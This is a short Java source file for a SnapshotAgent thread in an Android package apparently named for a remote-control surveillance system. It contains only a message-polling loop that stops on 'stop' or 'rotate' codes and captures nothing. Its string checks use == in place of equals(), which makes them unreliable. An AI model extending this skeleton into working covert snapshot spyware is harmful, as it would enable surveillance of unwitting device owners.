package com.ht.RCSAndroidGUI;

import android.os.Message;
import android.util.Log;

public class SnapshotAgent extends Thread implements Runnable {
	private Command command;
	
	public SnapshotAgent() { 
		command = new Command(); 
		
		Log.d("Que", "SnapshotAgent constructor");
	}
	
	public void run() {
		while (true) {
			try {
				processMessage();
			} catch (RCSException rcse) {
				String msg = rcse.getMessage();
				
				if (msg == "stop") {
					Log.d("Que", "SnapshotAgent closing");
					return;
				}
				
				// Manage log rotation
				if (msg == "rotate") {
					
				}
				
				return;
			}
			
			Utils.sleep(1000);
		}
	}
	
	private void processMessage() throws RCSException {
		Message m = getMessage();
		
		if (m == null)
			return;
		
		if (m.what != 'Q')
			return;
		
		switch (m.arg1) {
			case Agent.AGENT_STOP:
				throw new RCSException("stop");
				
			case Agent.AGENT_ROTATE:
				throw new RCSException("rotate");
				
			default: break;
		}
		
		return;
	}
	
	private Message getMessage() {
		Message m = command.getMessage();
		return m;
	}
	
	public void sendMessage(Message m) {
		command.pushMessage(m);
		
		return;
	}
	
	public void sendMessage(int arg1, int arg2) {
		Message m = new Message();
		m.arg1 = arg1;
		m.arg2 = arg2;
		m.what = 'Q';
		
		command.pushMessage(m);
		
		return;
	}
}
